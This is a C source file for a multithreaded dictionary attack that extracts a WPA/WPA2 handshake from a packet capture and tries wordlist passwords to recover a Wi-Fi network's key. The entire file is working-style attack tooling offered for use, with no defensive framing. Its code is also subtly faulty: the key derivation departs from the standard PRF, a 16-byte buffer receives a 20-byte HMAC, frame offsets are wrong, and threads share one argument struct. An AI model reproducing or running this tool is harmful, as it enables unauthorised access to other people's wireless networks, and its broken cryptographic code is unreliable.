#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <pthread.h>

#define MIC_LENGTH 16
#define PMK_LENGTH 32
#define ANONCE_LENGTH 32
#define SNONCE_LENGTH 32
#define MAC_ADDR_LENGTH 6
#define MAX_PASSWORD_LEN 64

typedef struct {
    uint8_t ap_mac[MAC_ADDR_LENGTH];
    uint8_t client_mac[MAC_ADDR_LENGTH];
    uint8_t anonce[ANONCE_LENGTH];
    uint8_t snonce[SNONCE_LENGTH];
    uint8_t mic[MIC_LENGTH];
    uint8_t *eapol_frame;
    int eapol_frame_len;
} handshake_t;

typedef struct {
    char *password;
    char *ssid;
    handshake_t *handshake;
} thread_args_t;

// Derive PMK using PBKDF2-HMAC-SHA1
void derive_pmk(const char *ssid, const char *password, uint8_t *pmk) {
    PKCS5_PBKDF2_HMAC_SHA1(password, strlen(password), (unsigned char *)ssid, strlen(ssid), 4096, PMK_LENGTH, pmk);
}

// Derive PTK using PMK, ANonce, SNonce, and MAC addresses
void derive_ptk(const uint8_t *pmk, const uint8_t *anonce, const uint8_t *snonce,
                const uint8_t *ap_mac, const uint8_t *client_mac, uint8_t *ptk) {
    uint8_t data[MAC_ADDR_LENGTH * 2 + ANONCE_LENGTH + SNONCE_LENGTH];
    memcpy(data, ap_mac, MAC_ADDR_LENGTH);
    memcpy(data + MAC_ADDR_LENGTH, client_mac, MAC_ADDR_LENGTH);
    memcpy(data + 2 * MAC_ADDR_LENGTH, anonce, ANONCE_LENGTH);
    memcpy(data + 2 * MAC_ADDR_LENGTH + ANONCE_LENGTH, snonce, SNONCE_LENGTH);

    HMAC(EVP_sha1(), pmk, PMK_LENGTH, data, sizeof(data), ptk, NULL);
}

// Validate the MIC
int validate_mic(const uint8_t *ptk, const uint8_t *mic, const uint8_t *eapol_frame, int eapol_frame_len) {
    uint8_t calculated_mic[MIC_LENGTH];
    uint8_t eapol_mic[eapol_frame_len];
    memcpy(eapol_mic, eapol_frame, eapol_frame_len);
    memset(eapol_mic + eapol_frame_len - MIC_LENGTH, 0, MIC_LENGTH);

    HMAC(EVP_sha1(), ptk, MIC_LENGTH, eapol_mic, eapol_frame_len, calculated_mic, NULL);
    return memcmp(calculated_mic, mic, MIC_LENGTH) == 0;
}

// Extract handshake from PCAP file
int extract_handshake(const char *pcap_file, handshake_t *handshake) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_offline(pcap_file, errbuf);
    if (!handle) {
        fprintf(stderr, "[-] Error opening PCAP file: %s\n", errbuf);
        return 0;
    }

    struct pcap_pkthdr *header;
    const uint8_t *packet;
    int eapol_frames = 0;

    while (pcap_next_ex(handle, &header, &packet) == 1) {
        const uint8_t *ether_type = packet + 12;  // EtherType field
        if (ntohs(*(uint16_t *)ether_type) == 0x888e) {  // EAPOL
            if (eapol_frames == 0) {
                memcpy(handshake->ap_mac, packet + 6, MAC_ADDR_LENGTH);
                memcpy(handshake->client_mac, packet, MAC_ADDR_LENGTH);
                memcpy(handshake->anonce, packet + 26, ANONCE_LENGTH);
            } else {
                memcpy(handshake->snonce, packet + 26, SNONCE_LENGTH);
                memcpy(handshake->mic, packet + header->caplen - MIC_LENGTH, MIC_LENGTH);
                handshake->eapol_frame = malloc(header->caplen);
                memcpy(handshake->eapol_frame, packet, header->caplen);
                handshake->eapol_frame_len = header->caplen;
                pcap_close(handle);
                return 1;
            }
            eapol_frames++;
        }
    }

    pcap_close(handle);
    fprintf(stderr, "[-] Incomplete handshake.\n");
    return 0;
}

// Thread function for cracking
void *try_password(void *args) {
    thread_args_t *data = (thread_args_t *)args;
    uint8_t pmk[PMK_LENGTH], ptk[MIC_LENGTH];

    derive_pmk(data->ssid, data->password, pmk);
    derive_ptk(pmk, data->handshake->anonce, data->handshake->snonce,
               data->handshake->ap_mac, data->handshake->client_mac, ptk);

    if (validate_mic(ptk, data->handshake->mic, data->handshake->eapol_frame, data->handshake->eapol_frame_len)) {
        printf("[+] Password found: %s\n", data->password);
        exit(0);  // Exit once password is found
    }
    return NULL;
}

// Dictionary attack to crack WPA/WPA2 password
void crack_password(const char *pcap_file, const char *wordlist, const char *ssid) {
    handshake_t handshake;
    if (!extract_handshake(pcap_file, &handshake)) {
        return;
    }

    FILE *file = fopen(wordlist, "r");
    if (!file) {
        fprintf(stderr, "[-] Could not open wordlist file.\n");
        return;
    }

    printf("[*] Handshake successfully extracted.\n");
    printf("    AP MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           handshake.ap_mac[0], handshake.ap_mac[1], handshake.ap_mac[2],
           handshake.ap_mac[3], handshake.ap_mac[4], handshake.ap_mac[5]);

    printf("[*] Starting dictionary attack...\n");
    char password[MAX_PASSWORD_LEN];
    pthread_t threads[8];
    int thread_count = 0;

    while (fgets(password, sizeof(password), file)) {
        password[strcspn(password, "\n")] = '\0';  // Remove newline character

        thread_args_t args = {strdup(password), strdup(ssid), &handshake};
        pthread_create(&threads[thread_count++], NULL, try_password, &args);

        if (thread_count == 8) {
            for (int i = 0; i < 8; i++) {
                pthread_join(threads[i], NULL);
            }
            thread_count = 0;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(file);
    printf("[-] Password not found in the provided wordlist.\n");
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <pcap file> <wordlist> <SSID>\n", argv[0]);
        return 1;
    }

    crack_password(argv[1], argv[2], argv[3]);
    return 0;
}
